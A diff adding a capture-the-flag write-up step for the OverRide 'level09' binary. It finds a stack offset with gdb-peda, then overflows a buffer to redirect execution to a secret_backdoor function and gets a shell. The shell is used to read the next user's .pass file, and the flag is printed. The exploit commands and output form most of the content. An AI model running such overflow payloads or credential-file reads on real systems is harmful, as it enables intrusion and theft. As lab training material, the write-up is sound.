@@ -18,3 +18,33 @@ All functions matching regular expression "secret_backdoor":
 
 Non-debugging symbols:
 0x000055555555488c  secret_backdoor
+#get offset of RSP
+gdb-peda$ pattern_create 255
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%'
+gdb-peda$ run < <(python -c 'print "A"*40 + "\xff" + "\n" + "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%"')
+[...]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000555555554931 in handle_msg ()
+gdb-peda$ pattern_search
+Registers contain pattern buffer:
+RDI+52 found at offset: 69
+RBP+0 found at offset: 192
+Registers point to pattern buffer:
+[RSP] --> offset 200 - size ~55 => offset 200
+[...]
+# we write 208(0xd0) characters in the msg
+level09@OverRide:~$ python -c "print 'A'*40 + '\xd0' + '\n' + 'A' * 200 +
+'\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n' + 'sh'" > /tmp/payload_09
+level09@OverRide:~$ cat /tmp/payload_09 - | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+
